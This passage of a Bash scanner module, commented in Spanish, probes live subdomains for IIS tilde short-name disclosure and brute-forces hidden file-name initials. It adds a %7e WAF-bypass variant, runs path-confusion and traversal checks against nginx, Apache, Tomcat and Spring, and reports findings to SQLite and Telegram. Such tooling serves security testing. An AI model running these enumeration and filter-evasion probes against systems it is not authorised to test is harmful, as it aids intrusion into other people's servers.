  # Sonda básica: respuesta diferente para letra existente vs no existente
  # Si GET /*~1*/  devuelve 404 y GET /zzz*~1*/ devuelve 400 → vulnerable
  local S_WILD S_NOWILD
  S_WILD=$(_h_status "${BASE}/*~1*/" -g)
  S_NOWILD=$(_h_status "${BASE}/zzzzzzzz~1*/" -g)

  if [[ "$S_WILD" == "404" && "$S_NOWILD" == "400" ]]; then
    _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
      "IIS Tilde Short-Name Enumeration" "medium" \
      "IIS revela nombres 8.3 (/*~1*/ → 404 vs /zzz*~1*/ → 400) — enumerate archivos ocultos" \
      "iis_tilde_enum"

    # Intentar enumerar archivos en /: bruteforce letra inicial
    local FOUND_NAMES=()
    for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z \
                0 1 2 3 4 5 6 7 8 9 _ -; do
      local S_CHAR
      S_CHAR=$(_h_status "${BASE}/${CHAR}*~1*/" -g)
      [[ "$S_CHAR" == "404" ]] && FOUND_NAMES+=("${CHAR}*")
    done

    if [[ ${#FOUND_NAMES[@]} -gt 0 ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
        "IIS Tilde — Nombres enumerados" "medium" \
        "Primeras letras con archivos: [${FOUND_NAMES[*]}] — usar IIS-ShortName-Scanner para completar" \
        "iis_tilde_names"
    fi
  fi

  # Variantes WAF-bypass para el tilde
  # Algunos WAF filtran ~ pero no %7e
  if [[ "$S_WILD" != "404" ]]; then
    local S_ENC
    S_ENC=$(_h_status "${BASE}/*%7e1*/" -g)
    local S_NO_ENC
    S_NO_ENC=$(_h_status "${BASE}/zzzzzzzz%7e1*/" -g)
    if [[ "$S_ENC" == "404" && "$S_NO_ENC" == "400" ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
        "IIS Tilde Short-Name — WAF Bypass (%7e)" "medium" \
        "WAF filtra ~ pero %7e pasa — IIS tilde enumerable via %7e encoding" \
        "iis_tilde_waf_bypass"
    fi
  fi
}

# ══════════════════════════════════════════════════════════════
#  Función principal
# ══════════════════════════════════════════════════════════════
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 26 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local FINDINGS_BEFORE
  FINDINGS_BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='path_confusion';" \
    2>/dev/null || echo 0)

  # ── Obtener subdominios alive ──────────────────────────────
  local ALL_SUBS
  ALL_SUBS=$(_get_alive_subs "$DOMAIN_ID")
  [[ -z "$ALL_SUBS" ]] && [[ -s "$OUT_DIR/subs_alive.txt" ]] && \
    ALL_SUBS=$(cat "$OUT_DIR/subs_alive.txt")

  local CHECKED=0

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    ((CHECKED++))
    local BASE="https://${SUB}"

    # Bug #13: skip catch-all hosts upfront. Cualquier ..;/ devolverá 200 con SPA shell o 30x con WAF.
    if is_catchall_host "$BASE" 2>/dev/null; then
      log_info "[$CHECKED] $BASE — catch-all detectado, skip path_confusion"
      continue
    fi

    # ── Detectar tecnología del subdominio ─────────────────
    # Primero desde la DB (módulo 10 ya lo hizo)
    local TECH_DB
    TECH_DB=$(sqlite3 "$DB_PATH" \
      "SELECT GROUP_CONCAT(tech_name, ',') FROM technologies
       WHERE domain_id=${DOMAIN_ID} AND subdomain='${SUB}';" \
      2>/dev/null | tr ',' '\n' | tr '[:upper:]' '[:lower:]' | tr '\n' ':')

    # Si no hay tech en DB, detectar en tiempo real
    local TECH_LIVE=""
    [[ -z "$TECH_DB" ]] && TECH_LIVE=$(_detect_server_tech "$BASE" "$CURL_PROXY")

    local TECH="${TECH_DB}${TECH_LIVE}"

    # Log de lo que vamos a testear
    local TESTS=""
    echo "$TECH" | grep -qi "nginx"      && TESTS="${TESTS} nginx"
    echo "$TECH" | grep -qi "apache"     && ! echo "$TECH" | grep -qi "tomcat" && TESTS="${TESTS} apache_httpd"
    echo "$TECH" | grep -qi "tomcat"     && TESTS="${TESTS} tomcat"
    echo "$TECH" | grep -qi "spring\|java\|boot" && TESTS="${TESTS} spring"
    echo "$TECH" | grep -qi "iis\|asp\.net\|asp"   && TESTS="${TESTS} iis"

    # Si no detectamos nada específico, intentar off-by-slash
    # (muy común, falsos positivos bajos)
    [[ -z "$TESTS" ]] && TESTS=" nginx_probe"

    log_info "[$CHECKED] $BASE — tecnología:${TESTS}"

    # ── Lanzar solo los tests relevantes ──────────────────
    if echo "$TESTS" | grep -qi "nginx"; then
      _test_nginx_off_by_slash  "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
      _test_nginx_merge_slashes "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    if echo "$TESTS" | grep -qi "apache_httpd"; then
      _test_apache_confusion    "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    if echo "$TESTS" | grep -qi "tomcat"; then
      _test_tomcat_semicolon         "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
      _test_tomcat_rewrite_traversal "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    if echo "$TESTS" | grep -qi "spring"; then
      _test_spring_traversal    "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    if echo "$TESTS" | grep -qi "iis"; then
      _test_iis_tilde           "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    # off-by-slash si no detectamos nada (probe ligero)
    if echo "$TESTS" | grep -qi "nginx_probe"; then
      _test_nginx_off_by_slash  "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

  done <<< "$ALL_SUBS"

  local FINDINGS_AFTER NEW_FINDINGS
  FINDINGS_AFTER=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='path_confusion';" \
    2>/dev/null || echo 0)
  NEW_FINDINGS=$(( FINDINGS_AFTER - FINDINGS_BEFORE ))

  [[ "$NEW_FINDINGS" -gt 0 ]] && \
    _telegram_send "🔀 *Path Confusion completado*
🌐 \`${DOMAIN}\`
🔍 Subdominios: \`${CHECKED}\`
⚡ Findings: \`${NEW_FINDINGS}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

  log_ok "$MODULE_DESC: $NEW_FINDINGS findings en $CHECKED subdominios"
}
